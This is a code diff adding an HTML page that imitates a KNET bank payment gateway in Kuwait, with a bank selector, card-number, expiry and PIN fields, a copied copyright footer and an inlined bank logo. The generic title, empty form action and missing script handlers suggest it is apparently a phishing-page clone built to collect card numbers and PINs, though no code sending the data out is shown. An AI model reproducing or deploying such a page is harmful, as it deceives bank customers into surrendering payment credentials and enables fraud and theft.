@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link
+      href="kpg/css/payment-reset.css?ver=1.30"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link
+      href="kpg/css/payment-layout.css?ver=1.30"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link
+      href="kpg/css/payment-responsive.css?ver=1.30"
+      rel="stylesheet"
+      type="text/css"
+    />
+  </head>
+  <body>
+    <form
+      action=""
+      name="paypage"
+      id="paypage"
+      method="post"
+      autocomplete="off"
+      oncontextmenu="return false;"
+    >
+      <div id="PayPageEntry">
+        <div class="wrapper">
+          <div class="add"></div>
+          <div class="contentBox">
+            <img
+              class="logoHead"
+              src="data:image/jpeg;base64,/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAAA8AAD/4QMvaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjYtYzEzOCA3OS4xNTk4MjQsIDIwMTYvMDkvMTQtMDE6MDk6MDEgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE3IChXaW5kb3dzKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpEQUM3OUYwOTgxMzcxMUU5QTM4RERDRDVDRjhCOTNBNSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpEQUM3OUYwQTgxMzcxMUU5QTM4RERDRDVDRjhCOTNBNSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkRBQzc5RjA3ODEzNzExRTlBMzhERENENUNGOEI5M0E1IiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkRBQzc5RjA4ODEzNzExRTlBMzhERENENUNGOEI5M0E1Ii8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+/+4ADkFkb2JlAGTAAAAAAf/bAIQABgQEBAUEBgUFBgkGBQYJ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"
+              alt="logo"
+            />
+            <img class="logoSep" src="images/separator.jpg" alt="spacer" />
+            <div class="innerwrapper">
+              <div
+                class="notification"
+                style="
+                  border: #ff0000 1px solid;
+                  margin-top: 2%;
+                  background-color: #f7dadd;
+                  font-size: 12px;
+                  font-family: helvetica, arial, sans serif;
+                  color: #ff0000;
+                  padding-right: 15px;
+                  display: none;
+                "
+                id="otpmsgDC"
+              ></div>
+
+              <!--Customer Validation  for knet-->
+              <div
+                class="notification"
+                style="
+                  border: #ff0000 1px solid;
+                  margin-top: 2%;
+                  background-color: #f7dadd;
+                  font-size: 12px;
+                  font-family: helvetica, arial, sans serif;
+                  color: #ff0000;
+                  padding-right: 12px;
+                  display: none;
+                "
+                id="CVmsg"
+              ></div>
+
+              <p class="paymentheader" style="padding-top: 18px">
+                Billing Information
+              </p>
+
+              <div class="row">
+                <div class="col">
+                  <span class="paymentlabel">Merchant: </span>
+                </div>
+                <div class="col"><span class="paymentdata">AUB PAY</span></div>
+              </div>
+
+              <div class="row">
+                <div class="col">
+                  <span class="paymentlabel"> Website: </span>
+                </div>
+                <div class="col">
+                  <span class="paymentdata">
+                    https://eportal.ahliunited.com.kw
+                  </span>
+                </div>
+              </div>
+
+              <div class="row" id="OrgTranxAmt">
+                <div class="col">
+                  <span class="paymentlabel"> Amount: </span>
+                </div>
+                <div class="col">
+                  <span class="paymentdata"> KD&nbsp;1.000 </span>
+                </div>
+              </div>
+
+              <!-- Added for PG Eidia Discount starts   -->
+
+              <div class="row" id="DiscntRate" style="display: none"></div>
+              <div class="row" id="DiscntedAmt" style="display: none"></div>
+
+              <!-- Added for PG Eidia Discount ends   -->
+            </div>
+
+            <div id="savedCardDiv" style="display: none">
+              <div class="row" id="storedpan" style="float: right">
+                <!-- Commented the bank name display for kfast starts -->
+                <span class="paymentdata" style="margin-left: 20px"> </span>
+
+                <!-- Commented the bank name display for kfast ends -->
+
+                <!-- </option> -->
+              </div>
+              <br />
+              <!-- Added for Points Redemption -->
+
+              <div id="row">
+                <div class="column">
+                  <span class="paymentlabel"> PIN : </span>
+                </div>
+                <div class="column" style="margin-left: 0px">
+                  <input
+                    name="debitsavedcardPIN"
+                    id="debitsavedcardPIN"
+                    autocomplete="off"
+                    title="Should be in number. Length should be 4"
+                    type="password"
+                    size="4"
+                    maxlength="4"
+                    class="paymentinput"
+                    style="width: 125%"
+                    onkeyup="return ValidateNumPin(event);"
+                    onkeypress="return ValidateNumPin(event);"
+                    ondrop="return false;"
+                    oncopy="return false;"
+                    onpaste="return false;"
+                  />
+                </div>
+              </div>
+
+              <!-- Added for Points Redemption -->
+            </div>
+
+            <div id="FCUseDebitEnable">
+              <p class="paymentheader">Card Information</p>
+              <div class="row">
+                <div class="col">
+                  <span class="paymentlabel">Select Your Bank:</span>
+                </div>
+                <div class="col">
+                  <select
+                    class="paymentselect bank"
+                    onchange="javascript:validatebank(this.value)"
+                  >
+                    <option value="bankname" title="Select Your Bank">
+                      Select Your Bank
+                    </option>
+
+                    <option
+                      value="201835874705789|Ahli United Bank [AUB]|0.000"
+                      title="Ahli United Bank [AUB]"
+                    >
+                      Ahli United Bank [AUB]
+                    </option>
+                    <option
+                      value="201835825650202|Al Ahli Bank of Kuwait [ABK]|0.000"
+                      title="Al Ahli Bank of Kuwait [ABK]"
+                    >
+                      Al Ahli Bank of Kuwait [ABK]
+                    </option>
+                    <option
+                      value="201835874323529|Al Rajhi Bank [Rajhi]|0.000"
+                      title="Al Rajhi Bank [Rajhi]"
+                    >
+                      Al Rajhi Bank [Rajhi]
+                    </option>
+                    <option
+                      value="201835825702917|Bank of Bahrain Kuwait [BBK]|0.000"
+                      title="Bank of Bahrain Kuwait [BBK]"
+                    >
+                      Bank of Bahrain Kuwait [BBK]
+                    </option>
+                    <option
+                      value="201835825739345|Boubyan Bank [Boubyan]|0.000"
+                      title="Boubyan Bank [Boubyan]"
+                    >
+                      Boubyan Bank [Boubyan]
+                    </option>
+                    <option
+                      value="201835825797735|Burgan Bank [Burgan]|0.000"
+                      title="Burgan Bank [Burgan]"
+                    >
+                      Burgan Bank [Burgan]
+                    </option>
+                    <option
+                      value="201835874180325|Commercial Bank of Kuwait [CBK]|0.000"
+                      title="Commercial Bank of Kuwait [CBK]"
+                    >
+                      Commercial Bank of Kuwait [CBK]
+                    </option>
+                    <option
+                      value="201835874161720|Doha Bank [Doha]|0.000"
+                      title="Doha Bank [Doha]"
+                    >
+                      Doha Bank [Doha]
+                    </option>
+                    <option
+                      value="202014163347122|Eidity [KNET]|0.000"
+                      title="Eidity [KNET]"
+                      style="color: #0077d5; font-weight: bold"
+                    >
+                      Eidity [KNET]
+                    </option>
+                    <option
+                      value="201835874003609|Gulf Bank of Kuwait [GBK]|0.000"
+                      title="Gulf Bank of Kuwait [GBK]"
+                    >
+                      Gulf Bank of Kuwait [GBK]
+                    </option>
+                    <option
+                      value="202330309907602|KFH [TAM]|0.000"
+                      title="KFH [TAM]"
+                    >
+                      KFH [TAM]
+                    </option>
+                    <option
+                      value="201835873981165|Kuwait Finance House [KFH]|0.000"
+                      title="Kuwait Finance House [KFH]"
+                    >
+                      Kuwait Finance House [KFH]
+                    </option>
+                    <option
+                      value="201835873955088|Kuwait International Bank [KIB]|0.000"
+                      title="Kuwait International Bank [KIB]"
+                    >
+                      Kuwait International Bank [KIB]
+                    </option>
+                    <option
+                      value="201835873914520|National Bank of Kuwait [NBK]|0.000"
+                      title="National Bank of Kuwait [NBK]"
+                    >
+                      National Bank of Kuwait [NBK]
+                    </option>
+                    <option
+                      value="202217198565076|NBK [Weyay]|0.000"
+                      title="NBK [Weyay]"
+                    >
+                      NBK [Weyay]
+                    </option>
+                    <option
+                      value="201835873889074|Qatar National Bank [QNB]|0.000"
+                      title="Qatar National Bank [QNB]"
+                    >
+                      Qatar National Bank [QNB]
+                    </option>
+                    <option
+                      value="201835873869950|Union National Bank [UNB]|0.000"
+                      title="Union National Bank [UNB]"
+                    >
+                      Union National Bank [UNB]
+                    </option>
+                    <option
+                      value="201835873825294|Warba Bank [Warba]|0.000"
+                      title="Warba Bank [Warba]"
+                    >
+                      Warba Bank [Warba]
+                    </option>
+                  </select>
+                </div>
+              </div>
+
+              <div class="row" id="Paymentpagecardnumber">
+                <!-- Added for Points Redemption -->
+
+                <div class="col">
+                  <label class="paymentlabel">Card Number:</label>
+                </div>
+
+                <!-- Added for Points Redemption -->
+
+                <div class="col" style="width: 59%">
+                  <label>
+                    <select class="paymentselect" name="dcprefix" id="dcprefix">
+                      <option value="bankcode" title="Prefix">Prefix</option>
+                    </select>
+                  </label>
+                  <!-- Modified for 8 digit bin mandate changes- starts  -->
+                  <label>
+                    <input
+                      name="debitNumber"
+                      id="debitNumber"
+                      type="text"
+                      size="10"
+                      class="paymentinput"
+                      maxlength="10"
+                      onclick="validateprefixid(this.value);"
+                      onkeyup="return ValidateNumPin(event);"
+                      onkeypress="return ValidateNumPin(event);"
+                      ondrop="return false;"
+                      oncopy="return false;"
+                      onpaste="return false;"
+                      title="Should be in number. Length should be 10"
+                    />
+                  </label>
+                  <!-- Modified for 8 digit bin mandate changes- ends  -->
+                </div>
+              </div>
+
+              <div class="row" id="cardExpdate">
+                <div class="col" id="debitExpDate">
+                  <label class="paymentlabel"> Expiration Date: </label>
+                </div>
+
+                <div class="col">
+                  <select
+                    class="paymentselect"
+                    onchange="javascript:setdebitMonth(this.value)"
+                  >
+                    <option value="0">MM</option>
+
+                    <option value="1">01</option>
+
+                    <option value="2">02</option>
+
+                    <option value="3">03</option>
+
+                    <option value="4">04</option>
+
+                    <option value="5">05</option>
+
+                    <option value="6">06</option>
+
+                    <option value="7">07</option>
+
+                    <option value="8">08</option>
+
+                    <option value="9">09</option>
+
+                    <option value="10">10</option>
+
+                    <option value="11">11</option>
+
+                    <option value="12">12</option>
+                  </select>
+
+                  <select
+                    onchange="javascript:setdebitYear(this.value)"
+                    class="paymentselect"
+                  >
+                    <option value="0">YYYY</option>
+
+                    <option value="2023">2023</option>
+
+                    <option value="2024">2024</option>
+
+                    <option value="2025">2025</option>
+
+                    <option value="2026">2026</option>
+
+                    <option value="2027">2027</option>
+
+                    <option value="2028">2028</option>
+
+                    <option value="2029">2029</option>
+
+                    <option value="2030">2030</option>
+
+                    <option value="2031">2031</option>
+
+                    <option value="2032">2032</option>
+
+                    <option value="2033">2033</option>
+
+                    <option value="2034">2034</option>
+
+                    <option value="2035">2035</option>
+
+                    <option value="2036">2036</option>
+
+                    <option value="2037">2037</option>
+
+                    <option value="2038">2038</option>
+
+                    <option value="2039">2039</option>
+
+                    <option value="2040">2040</option>
+
+                    <option value="2041">2041</option>
+
+                    <option value="2042">2042</option>
+
+                    <option value="2043">2043</option>
+
+                    <option value="2044">2044</option>
+
+                    <option value="2045">2045</option>
+
+                    <option value="2046">2046</option>
+
+                    <option value="2047">2047</option>
+
+                    <option value="2048">2048</option>
+
+                    <option value="2049">2049</option>
+
+                    <option value="2050">2050</option>
+
+                    <option value="2051">2051</option>
+
+                    <option value="2052">2052</option>
+
+                    <option value="2053">2053</option>
+
+                    <option value="2054">2054</option>
+
+                    <option value="2055">2055</option>
+
+                    <option value="2056">2056</option>
+
+                    <option value="2057">2057</option>
+
+                    <option value="2058">2058</option>
+
+                    <option value="2059">2059</option>
+
+                    <option value="2060">2060</option>
+
+                    <option value="2061">2061</option>
+
+                    <option value="2062">2062</option>
+
+                    <option value="2063">2063</option>
+
+                    <option value="2064">2064</option>
+
+                    <option value="2065">2065</option>
+
+                    <option value="2066">2066</option>
+                  </select>
+                </div>
+              </div>
+              <div class="row" id="PinField">
+                <!-- <div class="col-lg-12"><label class="col-lg-6"></label></div> -->
+                <input type="hidden" name="cardPinType" value="A" />
+                <div class="col" id="eComPin">
+                  <span class="paymentlabel" style="padding-left: 18px">
+                    PIN:
+                  </span>
+                </div>
+                <div>
+                  <input
+                    name="cardPin"
+                    id="cardPin"
+                    autocomplete="off"
+                    title="Should be in number. Length should be 4"
+                    type="password"
+                    size="4"
+                    maxlength="4"
+                    class="paymentinput pin"
+                    onkeyup="return ValidateNumPin(event);"
+                    onkeypress="return ValidateNumPin(event);"
+                    ondrop="return false;"
+                    oncopy="return false;"
+                    onpaste="return false;"
+                  />
+                </div>
+              </div>
+            </div>
+
+            <div class="row">
+              <div class="col4" style="margin-left: 10px; text-align: center">
+                <div id="loading1">Processing.. please wait ...</div>
+
+                <input
+                  name="proceed"
+                  type="button"
+                  class="button"
+                  onclick="onPay();"
+                  id="proceed"
+                  value="Submit"
+                />
+                <input
+                  type="button"
+                  name="proceedReset"
+                  id="proceedReset"
+                  class="button"
+                  value="Reset"
+                  onclick="onReset_buttonClicked();"
+                />
+                <input
+                  name="proceedCancel"
+                  type="button"
+                  class="button"
+                  onclick="cancelPage();"
+                  id="cancel"
+                  value="Cancel"
+                />
+              </div>
+            </div>
+
+            <!--  <div class="row" > -->
+            <!--  <div class="displayImage"  id="banklogo">
+                        <span>
+                        <div>
+                            <p class="para" id="paying">You are paying through</p>
+                            <img src="" id="image">
+                            <p class="para" id="bankname1"><br>
+                                 </div> </span></div> -->
+            <center>
+              <label
+                class="col-lg-12"
+                style="
+                  color: red;
+                  font-family: Verdana, Arial, Helvetica, sans-serif;
+                  font-size: 12px;
+                  font-weight: bold;
+                  width: 95%;
+                  float: left;
+                  vertical-align: middle;
+                "
+                id="debitCaptchaMsg"
+              >
+              </label>
+            </center>
+
+            <center>
+              <label
+                class="col-lg-12"
+                style="
+                  color: red;
+                  font-family: Verdana, Arial, Helvetica, sans-serif;
+                  font-size: 12px;
+                  font-weight: bold;
+                  padding-left: 15px;
+                  float: left;
+                  vertical-align: middle;
+                  display: none;
+                "
+                id="ValidationMessage"
+              >
+              </label>
+            </center>
+
+            <!--  </div>  -->
+          </div>
+        </div>
+
+        <footer>
+          <div>
+            <span>
+              <p
+                align="center"
+                style="
+                  margin: auto;
+                  width: 450px;
+                  max-width: 450px;
+                  text-align: center;
+                  font-size: 12px;
+                "
+              >
+                All Rights Reserved. Copyright 2023 © <br /><span
+                  style="font-weight: bold; color: #0077d5"
+                  >The Shared Electronic Banking Services Company</span
+                >
+              </p></span
+            >
+          </div>
+
+          <div id="DigiCertClickID_cM-vbZrL"></div>
+        </footer>
+      </div>
+    </form>
+  </body>
+</html>
